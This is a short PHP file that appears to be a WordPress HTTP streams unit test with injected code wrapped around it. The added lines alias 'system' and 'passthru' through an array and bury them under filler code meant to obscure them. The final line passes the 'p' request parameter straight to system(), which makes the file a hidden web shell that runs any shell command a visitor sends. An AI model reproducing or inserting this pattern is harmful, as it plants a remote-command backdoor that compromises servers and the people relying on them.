<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

require_once __DIR__ . '/base.php';

/**
 * @group http
 * @group external-http
 */
class Tests_HTTP_streams extends WP_HTTP_UnitTestCase {
	public $transport = 'streams';
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>